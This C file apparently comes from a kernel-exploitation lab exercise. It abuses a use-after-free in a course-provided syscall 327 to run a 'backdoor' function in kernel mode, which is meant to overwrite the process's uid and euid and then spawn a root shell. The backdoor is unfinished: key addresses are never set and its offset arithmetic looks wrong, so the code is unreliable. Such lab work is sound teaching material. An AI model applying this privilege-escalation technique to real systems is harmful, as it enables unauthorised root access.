#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
// Backdoor function
// NOTE: This function is supposed to execute in kernel space
// Therefore, you should make NO system calls or the kernel will crash
void backdoor() {
    // First, locate thread info. Check kernel source code arch/x86/include/asm/thread_info.h`
    // Note that you cannot get it directly with the system call. 

    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 2.  Note that this function is executed in the kernel that you can read/write directly.

    // Finally, you will need to rewrite the cred struct (uid and euid) and give your process highest privilege
    unsigned long sp;
    asm("mov %%rsp,%0" : "=g" (sp));

    long thread_info_addr = (sp & ~(16384 - 1));        //clearing the least significant 14 bits

    long* temp = (void*)thread_info_addr;  //use long since the syste, is 8 bytes and int is only 4; used for dereferencing task and cred
    long task_upper, task_lower, cred_upper, cred_lower;
    long task_addr, cred_addr;
    unsigned long uid_addr, euid_addr;

    task_upper = *temp; //first 4 bytes of task pointer
    //task_lower = *(temp + 4); //last 4 bytes of task pointer

    //task_addr = (task_lower << 32) | task_upper; //with 8 bytes there is no need for little-end

    long* temp2 = (void*) task_addr;
    cred_upper = *(temp2 + 1456);
    //cred_lower = *(temp2 + 1456 + 4);

    //cred_addr = (cred_lower << 32) | cred_upper;

    uid_addr = cred_addr + 4;
    euid_addr = cred_addr + 20;

    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    // Run the exploit    
    // You will need to use provided system calls to execute the backdoor() function in kernel mode 
    syscall(327, 1, NULL);      //allocate object 1 with pointer po1 pointing to it.
    syscall(327, 2, NULL);      //free the previously called object
    syscall(327, 3, &backdoor);         //allocate object 2 and address of backdoor as the data
    syscall(327, 4, NULL);      //check if object 1's field pointer exists, we get the function pointer and execute the function

    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
